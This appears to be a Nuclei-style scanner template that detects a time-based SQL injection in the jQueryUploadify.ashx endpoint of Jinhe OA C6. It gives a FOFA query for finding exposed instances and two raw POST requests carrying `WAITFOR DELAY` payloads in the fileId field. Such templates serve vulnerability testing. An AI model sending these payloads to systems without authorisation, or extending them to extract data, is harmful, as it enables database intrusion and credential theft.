id: jinheOA-C6-jQueryUploadify_ashx-sql

info:
  name: "金和OA C6 jQueryUploadify.ashx 接口 SQL 注入漏洞"
  author: Unknown
  severity: high
  description: |-
    fofa: app="金和网络-金和OA"
      金和OA C6 版本的 jQueryUploadify.ashx 接口存在可被利用的 SQL 注入缺陷。远程攻击者可通过构造恶意输入，在未授权情况下执行任意 SQL 语句，导致数据库敏感信息泄露（如管理员凭据、用户隐私数据）。在特定权限条件下，该漏洞可能被进一步利用实现服务器端代码执行或权限提升。
  reference:
  - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247487120&idx=1&sn=c372077148e423ac9168b500718453c7&chksm=c267bba3f51032b59c082fa29ebcdf299431fdc3fbdec6f9fd00e6cc08d237e59b862fef0752&token=101124693&lang=zh_CN#rd
  tags: 金和OA


http:
- raw:
  - |
    POST /C6/JQueryUpload/AjaxFile/jQueryUploadify.ashx HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
    Content-Type: application/x-www-form-urlencoded

    type=delete&fileId=-99';WAITFOR+DELAY'0:0:4'--
  - |
    POST /C6/JQueryUpload/AjaxFile/jQueryUploadify.ashx HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0
    Content-Type: application/x-www-form-urlencoded

    type=delete&fileId=-99';WAITFOR+DELAY'0:0:8'--
  matchers:
  - type: dsl
    dsl:
    - 'duration_1>=4 && duration_1<=5'
    - 'duration_2>=8 && duration_2<=9'
    condition: and



